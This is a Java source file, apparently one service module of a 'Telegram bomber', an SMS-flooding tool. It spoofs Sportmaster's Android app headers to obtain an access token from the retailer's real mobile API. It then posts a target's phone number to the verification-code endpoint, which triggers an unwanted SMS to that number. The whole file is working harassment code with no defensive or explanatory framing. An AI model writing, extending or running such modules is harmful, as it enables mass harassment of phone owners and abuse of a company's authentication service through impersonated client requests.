package com.example.webapp.telegram.bomber.services;


import com.example.webapp.telegram.bomber.services.utils.Callback;
import com.example.webapp.telegram.bomber.services.utils.Service;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import org.springframework.lang.NonNull;

public class Sportmaster extends Service {

    @Override
    public void run(OkHttpClient client, Callback callback) {
        client.newCall(new Request.Builder()
                .url("https://moappsmapi.sportmaster.ru/api/v1/auth")
                .header("User-Agent", "mobileapp-android-11")
                .header("X-SM-MobileApp", "null")
                .header("App-Version", "3.70.41")
                .header("OS", "ANDROID")
                .header("OS-Version", "11")
                .header("Device-Model", "null null")
                .get()
                .build()).enqueue(new okhttp3.Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                callback.onFailure(call, e);
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                try {
                    JSONObject json = new JSONObject(response.body().string());
                    JSONObject req = new JSONObject();

                    req.put("type", "phone");
                    req.put("value", phone);

                    client.newCall(new Request.Builder()
                            .url("https://moappsmapi.sportmaster.ru/api/v1/code")
                            .header("access-token", json
                                    .getJSONObject("data")
                                    .getString("AccessToken"))
                            .header("User-Agent", "mobileapp-android-11")
                            .header("X-SM-MobileApp", "null")
                            .header("App-Version", "3.70.41")
                            .header("OS", "ANDROID")
                            .header("OS-Version", "11")
                            .header("Device-Model", "null null")
                            .post(RequestBody.create(MediaType.parse("application/json"), req.toString()))
                            .build()).enqueue(callback);
                } catch (JSONException | NullPointerException e) {
                    callback.onError(e);
                }
            }
        });
    }
}